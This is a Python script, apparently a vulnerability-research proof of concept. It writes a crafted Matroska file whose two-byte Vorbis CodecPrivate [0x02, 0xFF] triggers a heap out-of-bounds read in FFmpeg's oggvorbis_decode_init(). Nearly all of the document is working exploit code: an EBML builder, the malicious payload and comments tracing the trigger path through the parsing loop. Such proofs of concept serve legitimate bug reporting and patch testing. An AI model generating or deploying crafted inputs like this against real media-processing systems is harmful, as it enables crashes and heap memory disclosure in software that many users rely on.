#!/usr/bin/env python3
"""
PoC Generator for VULN 002: Heap OOB Read in oggvorbis_decode_init()
Triggers CWE-125 OOB Read in the Xiph lacing while-loop condition
in libavcodec/libvorbisdec.c lines 72-82.

The malicious extradata is [0x02, 0xFF] (2 bytes):
  - 0x02: selects the Xiph lacing path (else-if *p == 2 branch)
  - p++ advances past 0x02 → p now points to extradata[1] = 0xFF
  - while(*p == 0xFF && sizesum < extradata_size):
      first check: *p=0xFF (valid), sizesum=1 < 2 (valid) → enters loop
      loop body: p++ advances to extradata[2] (OOB!)
  - while-condition re-check: *p dereferences extradata[2] → OOB READ
  - line 80: hsizes[i] += *p → second OOB READ
"""

import struct
import os

POC_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(POC_DIR, 'vuln_002_input.mkv')


def ebml_id_to_bytes(id_int):
    """Convert an EBML element ID integer to its byte representation."""
    if id_int <= 0xFF:
        return bytes([id_int])
    elif id_int <= 0xFFFF:
        return struct.pack('>H', id_int)
    elif id_int <= 0xFFFFFF:
        return struct.pack('>I', id_int)[1:]  # 3-byte big-endian
    else:
        return struct.pack('>I', id_int)


def ebml_vint(size):
    """Encode a size/value as an EBML variable-length integer (VINT)."""
    if size < 0x7F:
        return bytes([0x80 | size])
    elif size < 0x3FFF:
        return bytes([0x40 | (size >> 8), size & 0xFF])
    elif size < 0x1FFFFF:
        return bytes([0x20 | (size >> 16), (size >> 8) & 0xFF, size & 0xFF])
    elif size < 0x0FFFFFFF:
        return bytes([
            0x10 | (size >> 24),
            (size >> 16) & 0xFF,
            (size >> 8) & 0xFF,
            size & 0xFF
        ])
    else:
        raise ValueError(f"Size too large for VINT: {size}")


def elem(id_int, data):
    """Build an EBML element: ID bytes + VINT(len) + data bytes."""
    if isinstance(data, int):
        # Encode as unsigned integer with minimal bytes
        if data == 0:
            data = b'\x00'
        else:
            n = (data.bit_length() + 7) // 8
            data = data.to_bytes(n, 'big')
    elif isinstance(data, str):
        data = data.encode('ascii')
    elif not isinstance(data, (bytes, bytearray)):
        data = bytes(data)

    id_b = ebml_id_to_bytes(id_int)
    return id_b + ebml_vint(len(data)) + bytes(data)


def main():
    # ---- EBML Header ----
    ebml_header_body = (
        elem(0x4286, 1) +          # EBMLVersion = 1
        elem(0x42F7, 1) +          # EBMLReadVersion = 1
        elem(0x42F2, 4) +          # EBMLMaxIDLength = 4
        elem(0x42F3, 8) +          # EBMLMaxSizeLength = 8
        elem(0x4282, 'matroska') + # DocType = matroska
        elem(0x4287, 4) +          # DocTypeVersion = 4
        elem(0x4285, 2)            # DocTypeReadVersion = 2
    )
    ebml_root = elem(0x1A45DFA3, ebml_header_body)

    # ---- Segment Info ----
    info_body = (
        elem(0x2AD7B1, 1000000) +  # TimecodeScale = 1,000,000 ns
        elem(0x4D80, 'ffmpeg') +   # MuxingApp
        elem(0x5741, 'poc_gen')    # WritingApp
    )
    info = elem(0x1549A966, info_body)

    # ---- Audio sub-element ----
    audio_body = (
        elem(0xB5, struct.pack('>d', 44100.0)) +  # SamplingFrequency (float64)
        elem(0x9F, 2)                              # Channels = 2
    )
    audio = elem(0xE1, audio_body)

    # ---- Malicious CodecPrivate ----
    # This is the key payload: 2 bytes [0x02, 0xFF]
    # 0x02  → selects the Xiph lacing branch in oggvorbis_decode_init()
    # 0xFF  → triggers the while(*p == 0xFF) continuation, after which
    #          p advances PAST end-of-buffer, causing OOB read on re-check
    codec_private = bytes([0x02, 0xFF])

    # ---- Track Entry ----
    track_body = (
        elem(0xD7, 1) +                 # TrackNumber = 1
        elem(0x73C5, 1) +               # TrackUID = 1
        elem(0x83, 2) +                 # TrackType = 2 (audio)
        elem(0x86, 'A_VORBIS') +        # CodecID = A_VORBIS
        elem(0x63A2, codec_private) +   # CodecPrivate = [0x02, 0xFF]
        audio
    )
    track_entry = elem(0xAE, track_body)
    tracks = elem(0x1654AE6B, track_entry)

    # ---- Cluster (minimal, one empty SimpleBlock) ----
    # SimpleBlock format: TrackNumber (VINT) | Timecode (2 bytes BE) | flags (1 byte) | data
    simple_block_data = (
        bytes([0x81]) +      # TrackNumber = 1, VINT-encoded
        bytes([0x00, 0x00]) + # Relative timecode = 0
        bytes([0x00]) +      # Flags = 0
        bytes([0x00])        # Minimal audio payload
    )
    cluster_body = (
        elem(0xE7, 0) +                  # Timecode = 0
        elem(0xA3, simple_block_data)    # SimpleBlock
    )
    cluster = elem(0x1F43B675, cluster_body)

    # ---- Segment ----
    segment_body = info + tracks + cluster
    segment = elem(0x18538067, segment_body)

    # ---- Assemble file ----
    mkv_data = ebml_root + segment

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mkv_data)

    print(f"[+] Generated {OUTPUT_FILE} ({len(mkv_data)} bytes)")
    print(f"[+] CodecPrivate payload: {codec_private.hex()} (the malicious extradata)")
    print(f"[+] Expected trigger: OOB read in oggvorbis_decode_init() at libvorbisdec.c:74")


if __name__ == '__main__':
    main()
